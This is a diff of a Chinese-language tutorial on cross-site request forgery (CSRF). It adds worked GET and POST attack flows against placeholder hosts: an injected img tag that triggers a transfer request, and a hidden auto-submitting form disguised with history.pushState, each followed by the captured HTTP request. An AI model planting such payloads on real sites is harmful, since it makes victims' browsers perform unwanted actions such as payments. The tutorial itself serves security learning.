@@ -10,31 +10,88 @@ Cross-Site Request Forgery(CSRF)，跨站请求伪造攻击。
 
 CSRF通过构造get/post等请求，设法使已登录用户victim不知情的情况下，以受害者victim的身份发出"非其主观意愿的"HTTP请求。
 
-如通过"点击链接"等方式，以victim的身份将请求发给web后端，让后端执行增删改操作。
+* CSRF局限性:利用单一的CSRF漏洞能发起HTTP请求，但攻击者无法得到该HTTP请求的内容(Cookie可用但无法查看)，也无法得到任何回显(HTTP响应等)
+* CSRF扩展性:可联合其他漏洞(如XSS)进行攻击效果最大化
 
-* CSRF局限性:单一的CSRF攻击无法回显，即攻击者是无法查看到该伪造请求的响应结果。
-* CSRF扩展性:可联合其他漏洞(如XSS)进行攻击最大化。
+### CSRF类型 - 发出GET请求
 
-
-### CSRF分类+对应攻击方式
-
-* CSRF类型 - 伪造GET请求
-  * 构造请求 `http://csrfurl.com/payto?name=hacker&moneynumb=100`
   * 攻击思路 设法让victim的浏览器发出该GET请求
-     * 社工诱骗
-       * 直接 使victim点击该url发出GET请求
-       * 间接 使victim访问第三方网站A 通过A的前端ajax实现跨域 访问该url发出GET请求
-     * 漏洞联合 - 无交互地利用CSRF漏洞
+     * 社工诱骗 - 直接 使victim点击构造的url 发出GET请求 `http://get.csrf.com/payto?name=hacker&moneynumb=100`
+     * 漏洞联合 - 利用其他漏洞 无交互地利用CSRF漏洞
        * XSS + CSRF 构造并发送GET请求
-       * html注入 实现CSRF `<img src="http://csrfurl.com/payto?name=hacker&moneynumb=100">`
-* CSRF类型 - 伪造POST请求
-  * 构造请求 注意POST请求的参数在请求的body中 `name=hacker&moneynumb=100`
+       * 同源站点的html注入漏洞 发起CSRF(无Referer头)
+       * 不同源站点的html注入漏洞
+         * 使victim访问攻击者可控的第三方网站`http://3.com`(可注入html代码即可) 从而使victim发出GET请求(Referer头标明了请求发起源站url 如果后端验证Referer则CSRF利用失败)
+
+#### 流程
+
+在 http://www.3.com/demo 中注入以下html代码:
+```
+<img src="http://get.csrf.com/payto?name=hacker&moneynumb=100">
+```
+
+victim访问http://www.3.com/demo 则发出GET请求
+
+
+get.csrf.com收到GET请求:
+请求中的Referer说明了该get请求是从哪个url发起的
+```
+GET /payto?name=hacker&moneynumb=100 HTTP/1.1
+Host: get.csrf.com
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+Accept: image/webp,image/apng,image/*,*/*;q=0.8
+Referer: http://www.3.com/demo
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+```
+       
+### CSRF类型 - 发出POST请求
+
   * 攻击思路 设法让victim的浏览器发出该POST请求
     * 转变为Get更容易攻击 (可尝试将post请求改成get形式的请求 如果可以正常响应 则可以使用get请求进行csrf攻击)
-    * 社工诱骗
-      * 间接 使victim访问第三方网站A 通过A的前端ajax实现跨域 访问该url发出POST请求
     * 漏洞联合 - 无交互地利用CSRF漏洞
       * XSS + CSRF  构造并发送该POST请求
+      * 同源站点的html注入漏洞 发起CSRF(无Referer头)
+      * 不同源站点的html注入漏洞
+        * 使victim访问攻击者可控的第三方网站`https://3.com`(可注入html代码即可) 从而使victim发出POST请求(Referer头标明了请求发起源站url 如果后端验证Referer则CSRF利用失败)
+
+#### 流程
+
+在 https://3.com 中注入以下html代码:
+```
+  <script>history.pushState('', '', '/')</script>
+    <form name="frm" action="https://post.csrf.com/search" method="POST">
+      <input type="hidden" name="ip" value="1&#46;1&#46;1&#46;1" />
+      <input type="hidden" name="offset" value="0" />
+      <input type="hidden" name="limit" value="20" />
+      <input type="submit" value="Submit request" />
+    </form>
+<script>document.frm.submit()</script>
+```
+
+victim访问https://3.com 则发出POST请求
+
+
+post.csrf.com收到POST请求:
+可从Origin看出HTTP请求发起自https://3.com
+```
+POST /search HTTP/1.1
+Host: post.csrf.com
+Connection: keep-alive
+Content-Length: 28
+Cache-Control: max-age=0
+Origin: https://3.com
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: https://cn.bing.com/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+
+ip=1.1.1.1&offset=0&limit=20
+```
 
 ### 漏洞影响
 
